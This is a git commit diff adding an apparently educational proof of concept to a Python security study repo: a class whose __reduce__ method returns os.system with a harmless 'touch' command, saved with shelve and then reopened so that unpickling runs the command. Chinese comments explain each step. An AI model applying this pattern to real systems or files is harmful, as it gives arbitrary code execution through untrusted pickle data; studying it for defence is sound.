e05d166cbde2f566a48053c5214f2a395f2baec6
sugarP1G <zhuchenhui1990@163.com>
2021-04-20 16:46:17 +0800

    Update vuln.py

--- src/PythonSecurity/deserialization/LearningShelve/vuln.py
+++ src/PythonSecurity/deserialization/LearningShelve/vuln.py
@@ -1,6 +1,25 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+import os
 import shelve
 
-shelve.open()
+
+# os.system('touch /tmp/pickle_deserialization')
+class exp(object):
+    def __reduce__(self):
+        return os.system, ('touch /tmp/shelve_deserialization',)
+
+
+filename = "/tmp/test"
+db = shelve.open(filename)
+db['exp'] = exp()
+# close函数调用sync函数将字典序列化存储至指定文件。
+db.close()
+
+# 这里是用来阻塞程序，方便poc调试。
+input()
+
+# 反序列化文件内容，导致漏洞被触发
+db = shelve.open(filename)
+print(db['exp'])
